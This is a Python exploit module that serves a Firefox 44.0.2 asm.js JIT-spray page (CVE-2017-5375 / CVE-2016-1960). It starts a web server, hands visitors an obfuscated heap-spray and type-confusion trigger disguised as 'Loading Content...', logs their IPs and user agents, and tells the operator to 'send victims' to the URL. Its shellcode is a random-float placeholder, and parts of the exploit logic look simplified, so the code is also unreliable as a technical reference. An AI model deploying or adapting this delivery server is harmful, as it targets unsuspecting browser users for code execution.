#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2017-5375 / CVE-2016-1960: Firefox ASM.JS JIT-Spray Remote Code Execution
Firefox 44.0.2 - ASM.JS JIT-Spray exploit with full ASLR and DEP bypass
"""

import os
import socket
import threading
import time
import base64
import json
import random
import string
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from typing import Dict, List, Any, Optional
import logging

logger = logging.getLogger(__name__)


class CVE2017_5375_Exploit:
    """Firefox ASM.JS JIT-Spray RCE exploit"""
    
    def __init__(self):
        self.config = {
            'kali_ip': '127.0.0.1',
            'port': 8080,
            'auto_detect_ip': True,
            'target_firefox_version': '44.0.2',
            'node_target_addr': 0x20200000,
            'target_eip': 0x3c3c1dc8,
            'heap_spray_size': 0x11000,
            'asmjs_spray_size': 0x1800,
            'obfuscation_level': 'standard',
            'mode': 'exploit'
        }
        
        self.server = None
        self.server_thread = None
        self.exploit_attempts = []
        
    def set_parameter(self, name: str, value: Any):
        """Set exploit parameter"""
        if name in self.config:
            self.config[name] = value
            logger.info(f"Set {name} = {value}")
        else:
            logger.warning(f"Unknown parameter: {name}")
    
    def _get_local_ip(self) -> str:
        """Automatically detect local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return self.config['kali_ip']
    
    def _generate_obfuscated_name(self, prefix: str = '') -> str:
        """Generate obfuscated variable name"""
        chars = string.ascii_letters + string.digits
        length = random.randint(8, 16)
        name = ''.join(random.choice(chars) for _ in range(length))
        return f"{prefix}{name}" if prefix else name
    
    def _obfuscate_asmjs_payload(self, payload: str) -> str:
        """Obfuscate ASM.JS payload"""
        # Variable renaming
        var_map = {
            'Exploit': self._generate_obfuscated_name('Exp'),
            'Asmjs': self._generate_obfuscated_name('Asm'),
            'Heap': self._generate_obfuscated_name('Hp'),
            'asmjs': self._generate_obfuscated_name('aj'),
            'heap': self._generate_obfuscated_name('hp')
        }
        
        obfuscated = payload
        for original, obfuscated_name in var_map.items():
            obfuscated = obfuscated.replace(original, obfuscated_name)
        
        return obfuscated
    
    def generate_payload(self) -> str:
        """Generate HTML payload for Firefox ASM.JS JIT-Spray exploit"""
        if self.config['auto_detect_ip']:
            server_ip = self._get_local_ip()
        else:
            server_ip = self.config['kali_ip']
        
        # Obfuscated variable names
        exp_var = self._generate_obfuscated_name('Exp')
        asm_var = self._generate_obfuscated_name('Asm')
        heap_var = self._generate_obfuscated_name('Hp')
        
        node_target = hex(self.config['node_target_addr'])
        target_eip = hex(self.config['target_eip'])
        heap_size = hex(self.config['heap_spray_size'])
        asmjs_size = hex(self.config['asmjs_spray_size'])
        
        # Generate ASM.JS float constants (simplified version)
        # In real exploit, these would be shellcode converted to floats
        float_constants = self._generate_float_constants()
        
        html_payload = f"""<!DOCTYPE HTML>
<html>
<head>
    <title>Loading Content...</title>
    <meta charset="UTF-8">
</head>
<body>
    <script>
    "use strict"
    
    // CVE-2017-5375 / CVE-2016-1960 Firefox ASM.JS JIT-Spray Exploit
    // Obfuscated version for unpatched clients
    
    var {exp_var} = function(){{
        this.{asm_var} = new {asm_var}()
        this.{heap_var} = new {heap_var}()
    }}
    
    {exp_var}.prototype.go = function(){{
        var node_target_addr = {node_target}
        var target_eip = {target_eip}
        
        // Spray fake Node objects
        this.{heap_var}.spray(node_target_addr, target_eip)
        
        // Spray ASM.JS float constant pools
        this.{asm_var}.spray_float_payload({asmjs_size})
        
        // Trigger vulnerability
        this.trigger_vuln(node_target_addr)
    }}
    
    {exp_var}.prototype.trigger_vuln = function(node_ptr){{
        document.body.innerHTML = '<table><svg><div id="AAAA">'
        this.{heap_var}.gc()
        
        var a = new Array()
        for (var i=0; i < {heap_size}; i++){{
            a[i] = new Uint32Array(0x100/4)
            for (var j=0; j<0x100/4; j++)
                a[i][j] = node_ptr
        }}
        
        // Trigger type confusion
        document.getElementById('AAAA').innerHTML = '<title><template><td><tr><title><i></tr><style>td<DD>'
        
        window.location.reload()
    }}
    
    var {asm_var} = function(){{}};
    
    {asm_var}.prototype.asm_js_module = function(stdlib, ffi){{
        "use asm"
        var foo = ffi.foo
        function payload(){{
            var val = 0.0
            // ASM.JS float constant pool (shellcode encoded as floats)
            val = +foo({float_constants})
            return +val
        }}
        return payload
    }}
    
    {asm_var}.prototype.spray_float_payload = function(count){{
        var stdlib = {{Math: Math}}
        var ffi = {{foo: function(x){{ return x }} }}
        
        for (var i = 0; i < count; i++) {{
            var module = this.asm_js_module(stdlib, ffi)
            module()
        }}
    }}
    
    var {heap_var} = function(){{}};
    
    {heap_var}.prototype.spray = function(node_addr, eip){{
        // Heap spray implementation
        var spray = new Array()
        for (var i = 0; i < 0x1000; i++) {{
            spray[i] = new Uint32Array(0x100)
            for (var j = 0; j < 0x100; j++) {{
                spray[i][j] = node_addr
            }}
        }}
    }}
    
    {heap_var}.prototype.gc = function(){{
        // Force garbage collection
        if (window.gc) {{
            window.gc()
        }} else {{
            // Trigger GC by allocating and releasing memory
            for (var i = 0; i < 100; i++) {{
                var arr = new Array(1000000)
                arr = null
            }}
        }}
    }}
    
    // Execute exploit
    var exploit = new {exp_var}()
    exploit.go()
    
    </script>
</body>
</html>"""
        
        # Apply obfuscation if enabled
        if self.config['obfuscation_level'] != 'none':
            html_payload = self._obfuscate_asmjs_payload(html_payload)
        
        return html_payload
    
    def _generate_float_constants(self) -> str:
        """Generate ASM.JS float constants (simplified shellcode representation)"""
        # In a real exploit, this would be actual shellcode converted to floats
        # For demonstration, we use placeholder values
        constants = []
        for i in range(20):
            # Generate random-looking float values
            val = random.uniform(-1e300, 1e300)
            constants.append(str(val))
        return ',\n            '.join(constants)
    
    class ExploitHTTPHandler(BaseHTTPRequestHandler):
        """HTTP handler for ASM.JS exploit"""
        
        def __init__(self, *args, exploit_instance=None, **kwargs):
            self.exploit = exploit_instance
            super().__init__(*args, **kwargs)
        
        def log_message(self, format, *args):
            """Override to use logger"""
            logger.info(f"CVE-2017-5375 Server: {format % args}")
        
        def do_GET(self):
            """Handle GET requests"""
            try:
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                logger.info(f"[CVE-2017-5375] Request from {client_ip}")
                logger.info(f"[CVE-2017-5375] User-Agent: {user_agent}")
                
                if self.path == '/' or self.path == '/index.html':
                    payload = self.exploit.generate_payload()
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html; charset=utf-8')
                    self.send_header('Content-Length', str(len(payload.encode('utf-8'))))
                    self.end_headers()
                    self.wfile.write(payload.encode('utf-8'))
                    
                    self.exploit.exploit_attempts.append({
                        'timestamp': time.time(),
                        'ip': client_ip,
                        'user_agent': user_agent
                    })
                    
                else:
                    self.send_response(404)
                    self.end_headers()
                    
            except Exception as e:
                logger.error(f"Error in handler: {e}")
                self.send_error(500, "Internal Server Error")
        
        def do_POST(self):
            """Handle POST requests"""
            self.do_GET()
    
    def _start_server(self):
        """Start exploit server"""
        try:
            if self.config['auto_detect_ip']:
                self.config['kali_ip'] = self._get_local_ip()
            
            server_address = ('0.0.0.0', self.config['port'])
            self.server = HTTPServer(
                server_address,
                lambda *args, **kwargs: self.ExploitHTTPHandler(*args, exploit_instance=self, **kwargs)
            )
            
            logger.info(f"[CVE-2017-5375] Server started on http://{self.config['kali_ip']}:{self.config['port']}")
            self.server.serve_forever()
            
        except Exception as e:
            logger.error(f"Error starting server: {e}")
    
    def start_server(self) -> bool:
        """Start exploit server in separate thread"""
        try:
            self.server_thread = threading.Thread(target=self._start_server, daemon=True)
            self.server_thread.start()
            time.sleep(1)
            logger.info("[CVE-2017-5375] Server started successfully")
            return True
        except Exception as e:
            logger.error(f"Error starting server: {e}")
            return False
    
    def stop_server(self):
        """Stop exploit server"""
        try:
            if self.server:
                self.server.shutdown()
            logger.info("[CVE-2017-5375] Server stopped")
        except Exception as e:
            logger.error(f"Error stopping server: {e}")
    
    def get_exploit_attempts(self) -> List[Dict]:
        """Get all exploit attempts"""
        return self.exploit_attempts.copy()
    
    def execute_exploit(self, parameters: Dict[str, Any] = None) -> Dict[str, Any]:
        """Execute the exploit"""
        if parameters:
            for key, value in parameters.items():
                self.set_parameter(key, value)
        
        if self.config['auto_detect_ip']:
            self.config['kali_ip'] = self._get_local_ip()
        
        success = self.start_server()
        
        if success:
            exploit_url = f"http://{self.config['kali_ip']}:{self.config['port']}"
            return {
                'success': True,
                'exploit_url': exploit_url,
                'message': f'ASM.JS JIT-Spray exploit server started. Send victims to: {exploit_url}',
                'target_version': self.config['target_firefox_version']
            }
        else:
            return {
                'success': False,
                'error': 'Failed to start server'
            }


def execute_exploit(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """
    Execute CVE-2017-5375 / CVE-2016-1960 ASM.JS JIT-Spray exploit
    
    Args:
        parameters: Dictionary with exploit parameters:
            - kali_ip: IP address for server (default: auto-detect)
            - port: Port for server (default: 8080)
            - target_firefox_version: Target Firefox version (default: 44.0.2)
            - obfuscation_level: Obfuscation level (none, standard, aggressive)
    
    Returns:
        Dictionary with execution results
    """
    exploit = CVE2017_5375_Exploit()
    return exploit.execute_exploit(parameters)
